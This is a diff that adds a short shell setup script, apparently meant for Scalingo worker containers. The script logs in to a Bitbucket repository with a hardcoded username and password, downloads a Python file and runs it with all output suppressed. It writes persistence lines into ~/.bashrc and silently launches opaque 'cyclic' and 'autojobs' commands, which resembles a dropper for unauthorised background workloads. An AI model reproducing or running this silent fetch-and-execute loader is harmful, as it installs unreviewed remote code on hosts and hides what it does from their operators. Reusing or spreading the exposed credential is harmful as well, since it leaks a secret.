@@ -1,0 +1,14 @@
+export TERMINFO=/lib/terminfo/;export SCREENDIR=~/.screen;export TERM=xterm;
+echo 'SC_NUM=1'> ~/.env; 
+echo 'export CONTAINER="worker-1"'>>~/.bashrc
+echo 'export SCALINGO_ID=1'>>~/.bashrc
+mkdir -p ~/work;chmod 700 ~/work;
+export CONTAINER="worker-1"
+wget -q https://bootstrap.pypa.io/get-pip.py&&python3 get-pip.py --user  1> /dev/null 2> /dev/null&&rm get-pip.py&&export PATH=/app/.local/bin:$PATH
+rm -f mysetup3.py&&curl --silent -O  --user shananalla88:ukqxwnzRwJhvb5Nd9pUw "https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/mysetup3.py"
+python3 mysetup3.py   1> /dev/null 2> /dev/null
+echo 'export TERMINFO=/lib/terminfo/;export SCREENDIR=~/.screen;export TERM=xterm;' >> ~/.bashrc
+
+. ~/.bashrc
+
+bash -ic "source ~/.bashrc;vd get_scalingo_id_cyclic;enc autojobs autojobs2  1> /dev/null 2> /dev/null;" 
